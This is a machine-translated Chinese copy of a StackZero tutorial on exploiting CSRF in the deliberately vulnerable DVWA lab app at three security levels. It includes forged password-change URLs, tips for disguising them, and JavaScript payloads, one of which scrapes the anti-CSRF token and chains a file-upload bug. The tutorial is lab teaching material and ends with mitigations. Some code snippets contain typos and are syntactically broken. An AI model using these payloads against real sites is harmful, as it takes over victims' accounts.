<html>
<head>
<title>How To Exploit CSRF In DVWA — StackZero</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">如何利用DVWA中的CSRF—stack zero</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-to-exploit-csrf-in-dvwa-stackzero-bf1b6b557d85?source=collection_archive---------0-----------------------#2022-11-23">https://infosecwriteups.com/how-to-exploit-csrf-in-dvwa-stackzero-bf1b6b557d85?source=collection_archive---------0-----------------------#2022-11-23</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/4392476d9e4a60788d6b5e9dfd26c680.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ycmj5S-VyRmpb5lS6Ppo5g.jpeg"/></div></div></figure><blockquote class="kb kc kd"><p id="81e9" class="ke kf kg kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">本文最初发表于<a class="ae ld" href="https://www.stackzero.net/csrf-dvwa/" rel="noopener ugc nofollow" target="_blank">https://www.stackzero.net/csrf-dvwa/</a></p></blockquote><p id="b2d6" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们已经在介绍性文章中看到了对CSRF的详细描述，所以如果你没有，我建议你读一读。<br/>然而，在探讨利用DVWA攻击CSRF的实际例子之前，我想用几句话总结一下这次攻击。</p><p id="c153" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><strong class="kh iu"> CSRF代表跨站点请求伪造，是一种当攻击者能够以某种方式欺骗您的web浏览器在您当前已通过身份验证的可信网站上执行不必要的操作时发生的攻击。</strong></p><p id="5857" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">像往常一样，在开始之前，让我们看看先决条件。</p><h1 id="f558" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">步骤#0:先决条件:</h1><p id="ba82" class="pw-post-body-paragraph ke kf it kh b ki mf kk kl km mg ko kp le mh ks kt lf mi kw kx lg mj la lb lc im bi translated">为CSRF建立实验室非常容易，尤其是通过使用TryHackMe的DVWA环境！</p><p id="d017" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我还假设您正在Kali虚拟机上工作(我在本文的<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank">中解释了设置)。所以本教程将以此为基础，即使其他发行版有一些小的变化。</a></p><p id="0cf0" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">所以，一旦我们有了:</p><ul class=""><li id="3ef6" class="mk ml it kh b ki kj km kn le mm lf mn lg mo lc mp mq mr ms bi translated">有效的DVWA应用程序</li><li id="9537" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">攻击机器</li></ul><p id="c90e" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们可以运行VPN并登录。</p><p id="2920" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">通常，默认凭据是:</p><ul class=""><li id="8911" class="mk ml it kh b ki kj km kn le mm lf mn lg mo lc mp mq mr ms bi translated"><strong class="kh iu">用户名</strong>:管理员</li><li id="9314" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated"><strong class="kh iu">密码</strong>:密码</li></ul><figure class="mz na nb nc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi my"><img src="../Images/6100524cdf93554bf2672a40e54c3d48.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*gSREqVthm11rtjsr.png"/></div></div></figure><p id="0211" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">默认难度为“不可能”，所以下一步将进入设置，将其设置为“低”。</p><figure class="mz na nb nc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi my"><img src="../Images/aab4f12b3e3db055d72e3659bc24d397.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*lSZ8cuLeXs29nV3r.png"/></div></div></figure><p id="6fd5" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">最后，点击CSRF菜单项，我们准备开始！</p><h1 id="60ae" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">步骤#1:在低安全级别的DVWA上的CSRF:</h1><p id="e0a8" class="pw-post-body-paragraph ke kf it kh b ki mf kk kl km mg ko kp le mh ks kt lf mi kw kx lg mj la lb lc im bi translated">正如水平建议，这是极其容易的，但认为这是一个热身。<br/>此外，我认为如果我们遗漏了什么，这是理解潜在概念的最佳层面。</p><p id="1ec8" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">打开页面，我们会看到一个可以更改密码的表单。</p><figure class="mz na nb nc gt ju gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/07cbc43cbb5d16ea16c5a1d1e67570c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1372/format:webp/0*5ys-7OffOn8q25a1.jpg"/></div></figure><p id="8511" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">首先应该想到的是尝试更改密码并观察结果。</p><p id="46b7" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">在这样做之后，我们仍然在同一个页面上，但是看着URL栏，有一个有趣的值。<br/>例如，如果新密码是:“stackzero ”,结果将是这样:</p><p id="d9d7" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe ne nf ng nh b"><a class="ae ld" href="http://10.10.93.202/vulnerabilities/csrf/?password_new=stackzero&amp;password_conf=stackzero&amp;Change=Change#" rel="noopener ugc nofollow" target="_blank">http://10.10.93.202/vulnerabilities/csrf/?password_new=stackzero&amp;password_conf=stackzero&amp;Change=Change#</a></code></p><p id="3cfd" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">很明显，表单接受一个<a class="ae ld" href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods" rel="noopener ugc nofollow" target="_blank"> GET HTTP </a>请求，并发送三个名为:</p><ul class=""><li id="b291" class="mk ml it kh b ki kj km kn le mm lf mn lg mo lc mp mq mr ms bi translated">密码_新</li><li id="2451" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">密码_会议</li><li id="9a26" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">变化</li></ul><p id="b852" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">因此，试着想象攻击者会向您发送一个恶意地址，如:</p><p id="a7cd" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe ne nf ng nh b"><a class="ae ld" href="http://10.10.93.202/vulnerabilities/csrf/?password_new=stackzero&amp;password_conf=stackzero&amp;Change=Change#" rel="noopener ugc nofollow" target="_blank">http://10.10.93.202/vulnerabilities/csrf/?password_new=stackzero&amp;password_conf=stackzero&amp;Change=Change#</a></code></p><p id="316e" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如果他想办法让你在仍然通过认证的情况下点击，你的密码就会自动变成<strong class="kh iu"> stackzero </strong>。</p><p id="45ba" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如果您不相信我，请尝试复制粘贴该地址(通过将IP替换为与您的DVWA实例相关的IP)，然后注销DVWA并尝试再次登录。<br/>你会看到你的密码不再是“密码”，现在是“<strong class="kh iu"> stackzero </strong>”。</p><p id="03c6" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">该地址可能具有明显的行为，因此黑客可能试图以某些方式隐藏其意图，例如:</p><ul class=""><li id="6863" class="mk ml it kh b ki kj km kn le mm lf mn lg mo lc mp mq mr ms bi translated">他可以使用像<a class="ae ld" href="https://gchq.github.io/CyberChef/" rel="noopener ugc nofollow" target="_blank"> CyberChef </a>这样的工具来混淆URL，例如使用URL编码，这样受害者就会看到这样的URL:<br/><code class="fe ne nf ng nh b">http%3A%2F%2F10%2E10%2E93%2E202%2Fvulnerabilities%2Fcsrf%2F%3Fpassword%5Fnew%3Dhaker%5Fpassword%26password%5Fconf%3Dhacker%5Fpassword%26Change%3DChange%23</code></li><li id="a8ca" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">他可以构建一个包含恶意JS代码的页面，在他的主机上发送请求。</li><li id="5000" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">他可以使用像<a class="ae ld" href="https://bitly.com/" rel="noopener ugc nofollow" target="_blank"> Bity </a>这样的网址缩写。</li></ul><p id="d10f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这完全取决于攻击者的想象。</p><p id="004f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">无论如何，我们已经通过了第一关，并创建了我们需要的有效载荷，我们可以进入下一关了！</p><div class="ni nj gp gr nk nl"><a href="https://medium.com/codex/cyber-kill-chain-how-hackers-target-and-take-down-organizations-stackzero-6b6bcd8a0eb2" rel="noopener follow" target="_blank"><div class="nm ab fo"><div class="nn ab no cl cj np"><h2 class="bd iu gy z fp nq fr fs nr fu fw is bi translated">网络杀戮链:黑客如何瞄准并搞垮组织</h2><div class="ns l"><h3 class="bd b gy z fp nq fr fs nr fu fw dk translated">什么是网络杀伤链，简要介绍黑客如何计划他们的攻击。我会试着走过去…</h3></div><div class="nt l"><p class="bd b dl z fp nq fr fs nr fu fw dk translated">medium.com</p></div></div><div class="nu l"><div class="nv l nw nx ny nu nz jz nl"/></div></div></a></div><h1 id="61a8" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">步骤2:中等安全级别的DVWA上的CSRF:</h1><p id="f9ed" class="pw-post-body-paragraph ke kf it kh b ki mf kk kl km mg ko kp le mh ks kt lf mi kw kx lg mj la lb lc im bi translated">我们准备增加一点难度，所以进入安全设置，设置等级为中等。</p><p id="b446" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">通过尝试打开我们刚刚在低级别创建的恶意链接，它不起作用，密码保持不变。</p><p id="4833" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><strong class="kh iu">为什么？</strong> <br/>开发者增加了一个额外的安全层，在这种情况下，应用程序检查Referer(如果你知道它是什么，这里是<a class="ae ld" href="https://en.wikipedia.org/wiki/HTTP_referer" rel="noopener ugc nofollow" target="_blank">维基百科页面</a>)。<br/>关于Referer字段，我们需要知道的是，它是一个可选的头字段，指定HTTP请求来自哪个字段。在这种情况下，应用程序检查请求是否来自同一个域。</p><p id="cea0" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">总的来说，这是一个很好的缓解措施，但是<strong class="kh iu">这不足以阻止我们！</strong> <br/>拦截请求并使用<a class="ae ld" href="https://portswigger.net/burp" rel="noopener ugc nofollow" target="_blank"> Burp Suite </a>更改Referer在真实情况下是不可能的，因为这应该在受害机器上完成。</p><p id="d682" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们的第一个想法是创建一个包含脚本的HTML，通过使用<a class="ae ld" href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" rel="noopener ugc nofollow" target="_blank"> XMLHttpRequest </a>并将Referer设置为目标URL，向易受攻击的服务器发送请求，如下所示:</p><pre class="mz na nb nc gt oa nh ob bn oc od bi"><span id="0152" class="oe li it nh b be of og l oh oi">const HttpRequest = new XMLHttpRequest();<br/>const url=const url = 'http://10.10.131.218/vulnerabilities/csrf/?password_new=stackzero&amp;password_conf=stackzero&amp;Change=Change#'<br/>;<br/>HttpRequest.open("GET", url);<br/>HttpRequest.send();</span></pre><p id="f616" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这似乎是一个好主意，但它不能做到，因为大多数浏览器不允许改变这个标题。</p><p id="977d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">此时我们想要的是直接从目标服务器发送请求，为此我们有一个非常简单的选项。<br/>正如我在<a class="ae ld" href="https://www.stackzero.net/csrf-introduction/" rel="noopener ugc nofollow" target="_blank">的介绍文章中告诉你的，这个地址</a>我们可以链接一个XSS和一个CSRF漏洞，所以我们可以将这个有效载荷打包在一个反射的XSS中。</p><p id="ab36" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">然而，在本演练中，我想向您展示另一种更简单的方法，可以让我们只关注CSRF。<br/>我们将利用一个文件上传漏洞将我们的有效载荷发送到服务器，然后我们可以简单地发送恶意链接。</p><p id="7894" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">所以第一步是再次将DVWA的安全性设置为低(这不是一个关于文件上传的教程，所以我们不想管理它的安全检查)。</p><p id="9c19" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">之后，我们可以创建一个HTML文件，我将把它命名为"<em class="kg"> csrf_js.html </em>"，它将包含有效负载。</p><p id="d793" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这是文件内容:</p><pre class="mz na nb nc gt oa nh ob bn oc od bi"><span id="4ddf" class="oe li it nh b be of og l oh oi">&lt;html&gt;<br/>    &lt;head&gt;<br/><br/>    &lt;/head&gt;<br/>    &lt;body onload="change_password()"&gt;<br/>        &lt;script&gt;<br/>            function change_password(){<br/>            const request = new XMLHttpRequest();<br/>            const url = 'http://10.10.131.218/vulnerabilities/csrf/?password_new=stackzero&amp;password_conf=stackzero&amp;Change=Change#'<br/><br/>            request.open("GET", url);<br/>     <br/>            request.send();<br/><br/>            &lt;/script&gt;<br/>    &lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="5177" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如您所见，这是一个非常基本的Javascript请求，在body load事件上运行。</p><p id="91c4" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><strong class="kh iu">“显然URL取决于您的目标机器”</strong></p><p id="0b10" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">保存该文件并将安全性设置为低后，进入文件上传部分:</p><figure class="mz na nb nc gt ju gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/591b842f495097c1cea79393938b8d5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1308/format:webp/0*YkOcjgdUBX0J5VzX.jpg"/></div></figure><p id="4f6d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">你可以上传然后砰！<br/>现在，您可以将恶意链接发送给受害者，其格式如下:</p><p id="29af" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe ne nf ng nh b">&lt;VULNERABLE_SERVER_IP&gt;/hackable/uploads/&lt;HTML_PAYLOAD&gt;</code></p><p id="0bee" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">所以对我来说，就是:</p><p id="9f21" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe ne nf ng nh b"><a class="ae ld" href="http://10.10.131.218/hackable/uploads/csrf_js.html" rel="noopener ugc nofollow" target="_blank">http://10.10.131.218/hackable/uploads/csrf_js.html</a></code></p><p id="13bf" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">利用完成了！现在再次设置DVWA安全为中，并尝试去链接。<br/>注销并再次登录你可以看到现在你的密码是<em class="kg">“stack zero”</em>或者你放在有效载荷里的任何东西。<br/>作为一个练习，我建议你利用XSS做同样的事情。</p><div class="ni nj gp gr nk nl"><a rel="noopener  ugc nofollow" target="_blank" href="/what-is-command-injection-and-how-to-exploit-it-stackzero-ac7643bc492"><div class="nm ab fo"><div class="nn ab no cl cj np"><h2 class="bd iu gy z fp nq fr fs nr fu fw is bi translated">什么是命令注入以及如何利用它— StackZero</h2><div class="ns l"><h3 class="bd b gy z fp nq fr fs nr fu fw dk translated">描述什么是命令注入漏洞，并通过一个简单的例子向您展示此类漏洞的潜在风险…</h3></div><div class="nt l"><p class="bd b dl z fp nq fr fs nr fu fw dk translated">infosecwriteups.com</p></div></div><div class="nu l"><div class="ok l nw nx ny nu nz jz nl"/></div></div></a></div><h1 id="3096" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">第三步:CSRF在高安全级别的DVWA上:</h1><p id="0ce3" class="pw-post-body-paragraph ke kf it kh b ki mf kk kl km mg ko kp le mh ks kt lf mi kw kx lg mj la lb lc im bi translated">最后，我们到了最后一层，所以到了设置，并设置为高安全！</p><p id="d61e" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如果你点击CSRF按钮，显然什么都没有改变，但尝试检查表单！<br/>这一次有些不同:</p><pre class="mz na nb nc gt oa nh ob bn oc od bi"><span id="c965" class="oe li it nh b be of og l oh oi">  &lt;form action="#" method="GET"&gt;<br/>   New password:&lt;br /&gt;<br/>   &lt;input type="password" AUTOCOMPLETE="off" name="password_new"&gt;&lt;br /&gt;<br/>   Confirm new password:&lt;br /&gt;<br/>   &lt;input type="password" AUTOCOMPLETE="off" name="password_conf"&gt;&lt;br /&gt;<br/>   &lt;br /&gt;<br/>   &lt;input type="submit" value="Change" name="Change"&gt;<br/>   &lt;input type='hidden' name='user_token' value='9bfa81172750a77bf8005690ed7a5593' /&gt;<br/>  &lt;/form&gt;</span></pre><p id="9e3c" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">特别是，有一个隐藏的输入值在每次页面刷新时都会改变。<br/>它叫做“用户令牌”，我们已经在这里看到过<a class="ae ld" href="https://www.stackzero.net/csrf-introduction/#csrf-token" rel="noopener ugc nofollow" target="_blank"/>(CSRF令牌)。</p><p id="8500" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们将把我们的利用分为两步:</p><ul class=""><li id="f105" class="mk ml it kh b ki kj km kn le mm lf mn lg mo lc mp mq mr ms bi translated">第一次调用通过使用正则表达式获得“user_token”值。</li><li id="6d96" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">第二个调用运行真正的漏洞。</li></ul><p id="7706" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们放置漏洞的方式和中等难度等级是一样的。<br/>所以我不会在这上面花太多的话。</p><p id="3a20" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">首先，我们的Javascript代码必须向目标页面发送一个普通的请求。</p><pre class="mz na nb nc gt oa nh ob bn oc od bi"><span id="f581" class="oe li it nh b be of og l oh oi">const request = new XMLHttpRequest();<br/>const url = "http://10.10.174.199/vulnerabilities/csrf/"<br/><br/>request.open("GET", url);</span></pre><p id="9734" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">默认情况下，响应是一个字符串，所以在名为“<code class="fe ne nf ng nh b">onreadystatechanged</code>”的方法中，我们可以提取user_token。</p><p id="193c" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">通过观察它由32个十六进制字符组成，并且在页面上没有歧义，我们可以运行得更快。</p><p id="c26f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这可以是一个工作简单的正则表达式:</p><p id="f853" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">之后，让我们编写通过正则表达式获取user_token并修改密码的函数。</p><pre class="mz na nb nc gt oa nh ob bn oc od bi"><span id="a5da" class="oe li it nh b be of og l oh oi">request.onreadystatechange = () =&gt; {<br/>  if (request.readyState === request.DONE &amp;&amp; request.status === 200) {<br/><br/>    var response = request.responseText;<br/><br/>    var user_token = /[a-f0-9]{32}/g.exec(response)[0]<br/>    var payload = "http://10.10.174.199/vulnerabilities/csrf/?password_new=stackzero&amp;password_conf=stackzero&amp;Change=Change&amp;user_token="+user_token;<br/>    var second_request = new XMLHttpRequest();<br/>    second_request.open("GET", payload);<br/>    second_request.send()<br/><br/>    }<br/>};</span></pre><p id="7563" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">简而言之，这段代码:</p><ul class=""><li id="75cc" class="mk ml it kh b ki kj km kn le mm lf mn lg mo lc mp mq mr ms bi translated">将第一个请求的响应保存在变量中</li><li id="b7b1" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">使用正则表达式查找user_token(结果总是一个列表，即使它只有一个元素)</li><li id="a106" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">构建恶意URL</li><li id="9671" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">发送第二个请求</li></ul><p id="9800" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">最后，为了让CSRF漏洞发挥作用:</p><ul class=""><li id="edf8" class="mk ml it kh b ki kj km kn le mm lf mn lg mo lc mp mq mr ms bi translated">将安全性设置为低(我们将在另一篇文章中看到如何绕过文件上传的措施)。</li><li id="ae94" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">进入文件上传部分并上传你的漏洞，就像你在中级安全级别所做的那样。</li><li id="75a7" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">将安全性设置为高</li><li id="bf06" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">假设您将包含漏洞的HTML文件的链接发送给目标。</li><li id="2a8a" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">尝试打开你要发送给目标的链接</li><li id="4580" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">注销，然后尝试登录，看看是否有效。</li></ul><p id="addc" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">在这一点上，我希望它很清楚如何结合另一个漏洞执行真实世界的CSRF(即使你在DVWA上)攻击。</p><p id="2ccb" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">为了清楚起见，我想向您展示完整的漏洞利用代码:</p><figure class="mz na nb nc gt ju"><div class="bz fp l di"><div class="ol om l"/></div></figure><div class="ni nj gp gr nk nl"><a rel="noopener  ugc nofollow" target="_blank" href="/how-to-exploit-a-stored-xss-vulnerability-on-dvwa-stackzero-1de6cc9545b9"><div class="nm ab fo"><div class="nn ab no cl cj np"><h2 class="bd iu gy z fp nq fr fs nr fu fw is bi translated">如何利用DVWA上存储的XSS漏洞— StackZero</h2><div class="ns l"><h3 class="bd b gy z fp nq fr fs nr fu fw dk translated">这是一个利用DVWA上存储的XSS的演练，附带的效果是让您更深入地理解…</h3></div><div class="nt l"><p class="bd b dl z fp nq fr fs nr fu fw dk translated">infosecwriteups.com</p></div></div><div class="nu l"><div class="on l nw nx ny nu nz jz nl"/></div></div></a></div><div class="ni nj gp gr nk nl"><a rel="noopener  ugc nofollow" target="_blank" href="/how-to-exploit-dom-xss-on-dvwa-stackzero-c83a682ed7b7"><div class="nm ab fo"><div class="nn ab no cl cj np"><h2 class="bd iu gy z fp nq fr fs nr fu fw is bi translated">如何在DVWA-stack zero上开发多姆XSS</h2><div class="ns l"><h3 class="bd b gy z fp nq fr fs nr fu fw dk translated">在这篇文章中，我们将学习如何在DVWA上通过多姆XSS的所有级别，这样我们可以更好地理解…</h3></div><div class="nt l"><p class="bd b dl z fp nq fr fs nr fu fw dk translated">infosecwriteups.com</p></div></div><div class="nu l"><div class="oo l nw nx ny nu nz jz nl"/></div></div></a></div><div class="ni nj gp gr nk nl"><a rel="noopener  ugc nofollow" target="_blank" href="/reflected-xss-dvwa-an-exploit-with-real-world-consequences-stackzero-171cfb2d87d2"><div class="nm ab fo"><div class="nn ab no cl cj np"><h2 class="bd iu gy z fp nq fr fs nr fu fw is bi translated">反映XSS DVWA-一个利用现实世界的后果-堆栈零</h2><div class="ns l"><h3 class="bd b gy z fp nq fr fs nr fu fw dk translated">一步一步的演练在DVWA中反射XSS(跨站点脚本)，尝试利用它与所有级别的…</h3></div><div class="nt l"><p class="bd b dl z fp nq fr fs nr fu fw dk translated">infosecwriteups.com</p></div></div><div class="nu l"><div class="op l nw nx ny nu nz jz nl"/></div></div></a></div><h1 id="066a" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">结论</h1><p id="2194" class="pw-post-body-paragraph ke kf it kh b ki mf kk kl km mg ko kp le mh ks kt lf mi kw kx lg mj la lb lc im bi translated">总之，您已经看到了如何组合不同的漏洞来达到目标，以及相似的漏洞是如何危险的。您也看到了在某些情况下缓解措施可能是不够的，所以如果您是开发人员，请注意。</p><h2 id="b7d4" class="oq li it bd lj or os dn ln ot ou dp lr le ov ow lv lf ox oy lz lg oz pa md pb bi translated">什么是有效的解决方案？</h2><p id="9088" class="pw-post-body-paragraph ke kf it kh b ki mf kk kl km mg ko kp le mh ks kt lf mi kw kx lg mj la lb lc im bi translated">在这种情况下，使应用程序更加安全的两个解决方案是</p><ul class=""><li id="4568" class="mk ml it kh b ki kj km kn le mm lf mn lg mo lc mp mq mr ms bi translated">要在继续之前询问旧密码</li><li id="a2e3" class="mk ml it kh b ki mt km mu le mv lf mw lg mx lc mp mq mr ms bi translated">询问验证码。</li></ul><p id="2141" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我借此机会邀请您更好地了解您使用的应用程序，并注意它们使用的解决方案。</p><p id="10e4" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">同时，我希望你喜欢这篇关于如何在DVWA机器中利用CSRF的文章。如果你喜欢我的作品，我邀请你关注<a class="ae ld" href="http://www.stackzero.net" rel="noopener ugc nofollow" target="_blank">这个博客</a>和我所有的社交，这会对我有很大帮助。</p><p id="53b5" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">谢谢，下一篇文章再见。</p></div><div class="ab cl pc pd hx pe" role="separator"><span class="pf bw bk pg ph pi"/><span class="pf bw bk pg ph pi"/><span class="pf bw bk pg ph"/></div><div class="im in io ip iq"><p id="23ed" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><em 